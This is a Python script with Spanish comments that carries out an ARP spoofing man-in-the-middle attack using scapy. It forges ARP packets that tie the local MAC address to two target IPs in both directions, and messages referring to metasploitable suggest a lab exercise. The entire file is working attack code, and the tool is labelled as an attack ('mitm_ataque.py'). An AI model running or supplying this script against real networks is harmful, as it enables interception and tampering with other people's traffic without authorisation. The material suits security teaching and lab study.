#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

                        ARP Spoofing con scapy

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

import threading
import sys
from scapy.all import *
from termcolor import colored       #Libreria para colores

"""
    Clase para el ataque ARP_Spoofing
"""
class ARP_Spoofing(threading.Thread):

    def __init__(self,srcAddress,dstAddress):
        threading.Thread.__init__(self)
        self.srcAddress = srcAddress
        self.dstAddress = dstAddress

    def run(self):
        try:
            my_mac = get_mac_address()
            if not my_mac:
                print ("Cant get local mac address, quitting")
                sys.exit(1)
            packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=self.dstAddress,pdst=self.srcAddress)
            sendp(packet)
            print("Direccion MAC: " + str(my_mac) + " asociada a la direccion IP: " + str(self.srcAddress))
        except:
            print ("Error inesperado",sys.exc_info()[0])

"""
    Funcion que comprueba las direcciones mac
"""
def get_mac_address():
    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in my_macs:
        if(mac != "00:00:00:00:00:00"):
            return mac

"""
    Funcion principal del programa
"""
def main():

    if len(sys.argv) != 3:
        print ("Usage: mitm_ataque.py IP_LOCAL IP_DESTINO")
        sys.exit(1)

    print (colored("\nPrimer ataque: ",'red',attrs=['bold', 'blink']))
    print (colored("\t IP gateway: ",'green',attrs=['bold', 'blink']), sys.argv[1])
    print (colored("\t IP destino: ",'green',attrs=['bold', 'blink']), sys.argv[2])
    ataque_victima = ARP_Spoofing(sys.argv[1],sys.argv[2])

    print (colored("\nSegundo ataque: ",'red',attrs=['bold', 'blink']))
    print (colored("\t IP gateway: ",'green',attrs=['bold', 'blink']), sys.argv[2])
    print (colored("\t IP destino: ",'green',attrs=['bold', 'blink']), sys.argv[1])
    ataque_gateway = ARP_Spoofing(sys.argv[2],sys.argv[1])

    print ("\n###############################################################################")
    print (colored("\nComienza ataque local - metasploitable",'red',attrs=['bold', 'blink']))
    print ("")
    ataque_victima.run()

    print ("\n###############################################################################")
    print (colored("\nComienza ataque metasploitable - local",'red',attrs=['bold', 'blink']))
    print ("")
    ataque_gateway.run()

"""
Programa principal
"""
if __name__ == "__main__":
    main()
